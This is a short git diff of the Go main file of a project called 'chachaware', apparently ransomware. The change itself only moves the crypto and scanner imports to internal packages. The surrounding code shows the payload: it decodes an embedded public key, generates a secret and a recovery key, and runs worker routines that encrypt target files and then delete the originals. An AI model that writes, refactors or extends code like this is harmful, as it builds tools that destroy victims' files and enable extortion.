@@ -1,18 +1,18 @@
 package main
 
 import (
+	crypto2 "chachaware/internal/crypto"
+	"chachaware/internal/model/scanner"
 	"encoding/base64"
 	"fmt"
 	"os"
-	"chachaware/crypto"
-	"chachaware/scanner"
 	"sync"
 )
 
 func main() {
 	// Generate new secret and recovery key
 	storedPub, _ := base64.RawURLEncoding.DecodeString("I7rHqA5jmDlZWJ1E8zM8lDXRNSeJ678BnPMn4luIMTU")
-	secret, recovery, err := crypto.GenerateSecret(storedPub)
+	secret, recovery, err := crypto2.GenerateSecret(storedPub)
 	if err != nil {
 		panic(err)
 	}
@@ -71,7 +71,7 @@ func (w workerPool) worker() {
 
 		// Encrypt and delete target file
 		if err == nil && err2 == nil {
-			if err = crypto.Encrypt(w.secret, in, out); err == nil {
+			if err = crypto2.Encrypt(w.secret, in, out); err == nil {
 				os.Remove(path)
 			}
 		}
